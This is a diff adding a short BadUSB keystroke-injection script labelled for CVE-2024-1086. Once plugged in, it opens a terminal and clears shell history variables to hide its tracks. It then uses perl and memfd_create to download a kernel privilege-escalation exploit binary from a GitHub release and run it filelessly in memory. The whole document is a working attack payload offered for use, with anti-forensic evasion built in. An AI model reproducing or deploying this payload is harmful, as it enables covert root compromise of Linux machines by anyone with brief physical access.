@@ -1,0 +1,10 @@
+REM CVE-2024-1086 BADUSB
+REM Author: hed0rah
+DELAY 500
+CTRL-ALT t
+DELAY 1000
+STRING unset HISTFILE SAVEHIST PROMPT_COMMAND
+ENTER
+DELAY 500
+STRING perl -e 'require qw/syscall.ph/; my $fd = syscall(SYS_memfd_create(), $fn, 0); system "curl https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit -s >&$fd"; exec {"/proc/$$/fd/$fd"} "memfd";'
+ENTER
